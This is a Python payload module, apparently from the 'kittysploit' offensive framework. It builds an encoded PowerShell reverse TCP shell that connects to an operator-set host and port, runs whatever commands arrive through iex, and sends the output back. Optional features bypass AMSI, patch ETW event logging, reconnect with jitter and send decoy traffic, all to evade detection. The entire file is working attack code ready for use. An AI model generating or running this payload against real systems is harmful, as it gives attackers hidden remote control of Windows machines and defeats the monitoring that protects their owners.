#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import base64

from lib.c2.stager_evasion import powershell_prelude
from lib.c2.tcp_resilience import build_powershell_reconnect_wrapper, parse_cover_endpoints


class Module(Payload):

	CLIENT_LANGUAGE = "powershell"
	
	__info__ = {
		'name': 'PowerShell Command Shell, Reverse TCP',
		'description': 'Connect back and create a command shell via PowerShell',
		'category': PayloadCategory.SINGLE,
		'arch': Arch.OTHER,
		'platform': Platform.WINDOWS,
		'listener': 'listeners/multi/reverse_tcp',
		'handler': Handler.REVERSE,
		'session_type': SessionType.SHELL
	}

	lhost = OptString('127.0.0.1', 'Connect to IP address', True)
	lport = OptPort(4444, 'Connect to port', True)
	bypass_amsi = OptBool(False, 'Prepend AMSI bypass to generated stager', False, True)
	patch_etw = OptBool(False, 'Patch EtwEventWrite in stager process', False, True)
	reconnect = OptBool(True, 'Reconnect with jitter after disconnect', False, True)
	reconnect_interval = OptInteger(15, 'Base reconnect delay seconds', False, True)
	jitter_percent = OptInteger(35, 'Reconnect jitter percent', False, True)
	cover_traffic = OptBool(False, 'TCP connect decoys before callback', False, True)
	cover_endpoints = OptString('1.1.1.1:443,8.8.8.8:53', 'Comma-separated host:port decoys', False, True)
	encoder = OptString("", "Encoder", False, True)

	def _build_script(self, xf_client_code: str = None) -> str:
		core = (
			f"$c=New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});"
			"$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
		)
		if xf_client_code:
			loop = (
				"while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
				"$chunk=New-Object byte[] $i;[Array]::Copy($b,0,$chunk,0,$i);"
				"$decoded=_xf_decode $chunk;"
				"if($null -eq $decoded -or $decoded.Length -eq 0){continue};"
				"$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($decoded,0,$decoded.Length);"
				"$sb=(iex $d 2>&1|Out-String);"
				"$sb2=$sb+'PS '+($pwd).Path+'> ';"
				"$plain=([text.encoding]::ASCII).GetBytes($sb2);"
				"$by=_xf_encode $plain;"
				"$s.Write($by,0,$by.Length);$s.Flush()"
				"};$c.Close()"
			)
		else:
			loop = (
				"while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
				"$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
				"$sb=(iex $d 2>&1|Out-String);"
				"$sb2=$sb+'PS '+($pwd).Path+'> ';"
				"$by=([text.encoding]::ASCII).GetBytes($sb2);"
				"$s.Write($by,0,$by.Length);$s.Flush()"
				"};$c.Close()"
			)
		body = core + loop
		if bool(self.reconnect):
			body = build_powershell_reconnect_wrapper(
				body,
				reconnect_interval=float(self.reconnect_interval or 15),
				jitter_percent=float(self.jitter_percent or 35),
				cover_endpoints=parse_cover_endpoints(self.cover_endpoints)
				if bool(self.cover_traffic)
				else (),
			)
		prelude = powershell_prelude(
			bypass_amsi=bool(self.bypass_amsi),
			patch_etw=bool(self.patch_etw),
		)
		if xf_client_code:
			return prelude + xf_client_code + body
		return prelude + body

	def generate(self):
		xf = self._get_transform_instance()
		xf_code = None
		if xf and self._is_transform_compatible(xf) and hasattr(xf, "generate_client_code"):
			xf_code = xf.generate_client_code(self._get_client_language())
		if xf and not self._is_transform_compatible(xf):
			supported = getattr(xf, "get_supported_client_languages", lambda: [])()
			print_warning(
				f"Transform does not support client language 'powershell' (supported: {supported}). "
				"Generating without stream transform."
			)

		powershell_script = self._build_script(xf_code)
		encoded_script = base64.b64encode(powershell_script.encode('utf-16le')).decode('utf-8')
		return f"powershell -nop -EncodedCommand {encoded_script}"
